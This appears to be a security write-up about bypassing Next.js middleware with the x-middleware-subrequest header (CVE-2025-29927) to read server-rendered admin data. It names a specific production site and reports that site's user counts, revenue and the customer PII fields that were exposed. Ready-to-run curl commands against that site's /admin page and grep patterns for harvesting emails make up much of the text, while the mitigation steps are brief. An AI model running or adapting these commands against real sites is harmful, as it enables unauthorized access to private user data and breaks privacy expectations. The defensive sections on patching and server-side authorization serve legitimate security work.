# RSC (React Server Components) Data Exposure via Middleware Bypass

**Validated:** 2026-08-04 on everlyn.ai (Next.js 14 + Cloudflare + Auth.js v5)

## Vulnerability

When Next.js middleware is bypassed (via `x-middleware-subrequest`), the App Router **server-renders the full page with production data embedded in the initial HTML (RSC payload)**. This is NOT an API response — it's the SSR/SSG HTML that contains ALL data needed for the page to render.

## Data Exposed (Everlyn.ai Production)

| Metric | Value |
|--------|-------|
| Total Users | 171,784 |
| Paid Orders | 47,964 |
| Total Revenue | $595,900.99 USD |
| Videos Generated | 8,482,253 |
| 7-Day Users | 43 |
| 7-Day Orders | 6 |
| 7-Day Revenue | $0.00 |
| 7-Day Videos | 7 |

## PII Exposed (50+ Real Orders)

| Field | Example |
|-------|---------|
| Order ID | 851970327982149 |
| Email | <REDACTED-EMAIL> |
| Plan | Starter / Standard / Pro / Lite |
| Amount | $9.99 / $34.99 / $94.99 |
| Payment Method | Stripe / Crypto |
| Paid At | 8/4/2026, 9:56:08 AM |
| GitHub Username | (if linked) |
| Status | Paid / Refunded / etc. |

## Extraction Method

The RSC payload is embedded in `<script>` tags with a specific format (`self.__next_f.push([1, "..."])`). Data appears as structured JSON-like strings within the React Flight protocol stream.

```bash
# Get full admin page with RSC payload
curl -H "x-middleware-subrequest: /admin" https://everlyn.ai/admin > admin.html

# Extract key metrics (grep patterns)
grep -o '171,784\|595,900.99\|8,482,253' admin.html
grep -o '"email":"[^"]*"' admin.html | sort -u
```

## Why This Is Critical

1. **Data is in initial HTML** — no JavaScript execution needed
2. **No API call required** — bypasses any API-level auth
3. **Full production dataset** — not paginated, not filtered
4. **PII included** — emails, order details, timestamps
5. **GDPR/Privacy violation** — 171k+ user records exposed

## Detection

```bash
# Check if RSC payload contains production data
curl -s -H "x-middleware-subrequest: /admin" <target>/admin | \
  grep -E '171,784|595,900|8,482,253|total.*users|total.*revenue'
```

## Mitigation

1. **Patch Next.js** to 14.2.17+ / 15.0.3+ (CVE-2025-29927 fix)
2. **Add middleware matcher** to explicitly protect admin routes
3. **Move sensitive data to client-side fetch** with proper auth checks
4. **Implement proper authorization in Server Components** (not just middleware)

## Evidence

```bash
curl -H "x-middleware-subrequest: /admin" https://everlyn.ai/admin | \
  grep -c '171,784'
# Returns > 0 = VULNERABLE
```

## References

- CVE-2025-29927 (root cause)
- Next.js App Router RSC architecture
- Validated on everlyn.ai production (Next.js 14 + Cloudflare + Auth.js v5)